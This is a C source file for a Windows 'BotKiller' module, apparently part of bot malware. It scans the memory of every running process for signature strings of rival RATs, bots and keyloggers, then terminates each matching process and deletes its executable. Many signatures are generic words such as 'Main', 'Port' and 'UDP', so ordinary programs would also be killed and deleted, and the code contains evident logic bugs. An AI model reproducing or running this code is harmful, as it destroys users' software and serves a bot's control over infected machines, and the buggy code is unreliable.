
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include "BotKiller.h"

void DoSearch(unsigned long uStartAddr, unsigned long uEndAddr, PROCESSENTRY32 pe32 );
void KillBot(PROCESSENTRY32 pe32 );

struct s_Search
{
	char* szBot;
	char* szString;
};

struct s_Search sSearch[] = {
		{ "VNC Scanning Bot", "\x52\x46\x42\x20\x30\x30\x33\x2E\x30\x30\x38\x0A" },
		{ "RXBot", "[MAIN]" },
		{ "RXBot", "[SCAN]" },
		{ "RXBot", "[FTP]" },
		{ " Cerberus", "Main" },
		{ "Apocalypse RAT", "Main" },
		{ "Solitude RAT", "Main" },
		{ "xviscera RAT", "Main" },
		{ "BfBot", "" },
		{ "Albertino's RAT", "Main" },
		{ "DarkComet-RAT", "Main" },
		{ "Deeper RAT", "Main" },
		{ "Shit Stealer", "host" },
		{ "Poison Ivy", "steal" },
		{ "Fallen Bot", "xor" },
		{ "Spy-Net", "Spy-net" },
		{ "CyberGate", "Port" },
		{ "Outbreak Bot", "Accepted" },
		{ "Warbot", "UDP" },
		{ "NesBot", "Accepted" },
		{ "DDoSer", "UDP" },
		{ "MeTuS", "Connections" },
		{ "KyleBot", "MSN" },
		{ "TsGh v8", "Wrong" },
		{ "iRTehStealer", "URL" },
		{ "IMbot", "::[MAIN]::" },
		{ "kBot", "Ready Boss" },
		{ "Plague Bot", "Accepted" },
		{ "iSwarm Bot", "Accepted" },
		{ "s0lar Bot", "Wrong" },
		{ "Logik Bot", "Accepted" },
		{ "iStealer", "Main" },
		{ "Hidden Iye Keylogger", "" },
		{ "SkuLogger", "" },
		{ "Albertino's Keylogger", "" },
		{ "Armadax", "Main" },
		{ "StealthKeys", "Main" },
		{ "KeyController", "Main" },
		{ "FlyLogger", "Main" },
		{ "StormBot", "encrypt" },
		{ "bot1", "MS08" },
		{ "bot2", "MS10" },
		{ "XP", "[XP" },
		{ "VIS", "[VIS" },
		{ "7", "[7" },
		{ "wi7", "[W7" },
		{ "wind7", "[WI7" },
		{ "usa", "[USA|" },
		{ "svn", "[SVN|" },
		{ "deu", "[DEU|" },
		{ "can", "[CAN|" },
		{ "nld", "[NLD|" },
		{ "zaf", "[ZAF|" },
		{ "gbr", "[GBR|" },
		{ "isr", "[ISR|" },
		{ "ils", "[ILS|" },
		{ "bra", "[BRA|" },
		{ "fra", "[FRA|" },
		{ "aus", "[AUS|" },
		{ "swe", "[SWE|" },
		{ "Unknown", "&echo bye" },
		{ NULL, NULL }
	};

void DoSearch( unsigned long uStartAddr, unsigned long uEndAddr, PROCESSENTRY32 pe32 )
{
	char szBigBuffer[ 0x5000 ] = { 0 };
	unsigned char Curbuf[ 0x500 ] = { 0 };

	HANDLE hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID );

	#ifdef DEBUG
	printf( "Scanning PID: %d [ %s ]\nStart Address: 0x%08X End Address: 0x%08X\n\n", pe32.th32ProcessID, pe32.szExeFile, uStartAddr, uEndAddr );
	#endif
	
	unsigned long uCurAddr;
	for(uCurAddr = uStartAddr; uCurAddr <= uEndAddr; uCurAddr++ )
	{
		BOOL bRead = ReadProcessMemory( hProcess, (void *)uCurAddr, (void *)&Curbuf, sizeof( Curbuf ), NULL );
		if (bRead)
		{
			int c = 0;
			strcat( szBigBuffer, (char *)Curbuf );		 
			
			while( sSearch[ c ].szString != NULL )
			{
				if( strstr( szBigBuffer, sSearch[ c ].szString ) )
				{
					#ifdef DEBUG
					printf( "Found string \"%s\" in \"%s\" bot \"%s\"\n\n", sSearch[ c ].szString, pe32.szExeFile, sSearch[ c ].szBot );
					#endif
					KillBot( pe32 );			   
				}
				c++;
			}

			if( sizeof( szBigBuffer ) > 0x150 ) ZeroMemory( szBigBuffer, sizeof( szBigBuffer ) );
		}
		if (!bRead) break;
	}
	CloseHandle( hProcess );
}

void KillBot( PROCESSENTRY32 pe32 )
{
	MODULEENTRY32 me32;
	HANDLE hPath = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, pe32.th32ProcessID );
	me32.dwSize = sizeof( me32 );
	BOOL bRetval = Module32First( hPath, &me32 );
	   
	while ( bRetval )
	{
		if( !strcmp( pe32.szExeFile, me32.szModule ) )
		{
			SetFileAttributes( me32.szExePath, FILE_ATTRIBUTE_NORMAL );
			HANDLE hKillProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID );
			if (hKillProcess != NULL)
			{
				TerminateProcess(hKillProcess, 0);
				CloseHandle(hKillProcess);
			}
			Sleep( 500 );
			if (DeleteFile(me32.szExePath))
			{
				#ifdef DEBUG
				printf("Terminated and deleted %s\n", me32.szExePath);
				#endif
			}
		}
		bRetval = Module32Next( hPath, &me32 );
	}   
	CloseHandle( hPath );
}

void BotKiller()
{
	char szFile[ 128 ];
	GetModuleFileName( GetModuleHandle( NULL ), szFile, sizeof( szFile ) );

	char* szBlockList[ ] = { "explorer.exe", "hidserv.exe", "WINLOGON.EXE", "SERVICES.EXE", szFile };	 
	HANDLE hProcess = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	PROCESSENTRY32 pe32;

	pe32.dwSize = sizeof( PROCESSENTRY32 );
	BOOL bRetval = Process32First( hProcess, &pe32 );
	bool bDoSearch = true;

	while( bRetval )
	{
		Sleep( 250 );

		int i;
		for(i = 0; i < (int) ( sizeof( szBlockList ) / sizeof( char* ) ); i++ )
		{
			if (strstr(szBlockList[i], pe32.szExeFile)) bDoSearch = false;
		}
		
		if( bDoSearch )
		{
			DoSearch( 0x00400000, 0x004FFFFF, pe32 );
			DoSearch( 0x00100000 ,0x001FFFFF, pe32 );
		}
		else bDoSearch = true;
		bRetval = Process32Next( hProcess, &pe32 );
	}

	CloseHandle(hProcess);
	return;
}

void BotKillerThread()
{
	DWORD ThreadId;
	CloseHandle(CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) BotKiller, NULL, 0, &ThreadId));
	return;
}

